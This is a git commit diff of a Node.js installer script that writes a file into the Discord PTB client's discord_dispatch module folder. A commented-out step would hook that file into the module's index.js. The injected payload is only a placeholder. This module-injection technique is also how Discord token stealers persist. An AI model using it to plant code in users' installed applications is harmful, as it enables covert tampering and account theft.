8da4062e92ce7d8e9bef4868b5c03026eec4dbd5
Raz <91196395+Raz-js@users.noreply.github.com>
2022-11-18 11:04:23 +0200

    Update installer.js

--- dist/playground/installer.js
+++ dist/playground/installer.js
@@ -2,14 +2,14 @@ var fs = require('fs');
 
 var d45197b50ccc = `a`
 
-var a3b80a = fs.readdirSync(process.env.LOCALAPPDATA + "/DiscordPTB/").filter(fn => fn.startsWith('app-'));
+var appver = fs.readdirSync(process.env.LOCALAPPDATA + "/DiscordPTB/").filter(fn => fn.startsWith('app-'));
 
-fs.writeFile(process.env.LOCALAPPDATA + "/DiscordPTB/" + a3b80a + "/modules/discord_dispatch-1/discord_dispatch" + "/loadscripts.js", d45197b50ccc, function (err) {
+fs.writeFile(process.env.LOCALAPPDATA + "/DiscordPTB/" + appver + "/modules/discord_dispatch-1/discord_dispatch" + "/loadscripts.js", d45197b50ccc, function (err) {
   if (err) throw err;
   console.log('Installed!');
 });
 
-/*fs.appendFile('', ' This is my text.', function (err) {
+/*fs.appendFile(process.env.LOCALAPPDATA + "/DiscordPTB/" + appver + "/modules/discord_dispatch-1/discord_dispatch" + "/index.js", 'require(./loadscripts.js)', function (err) {
   if (err) throw err;
   console.log('Linked!');
 });*/
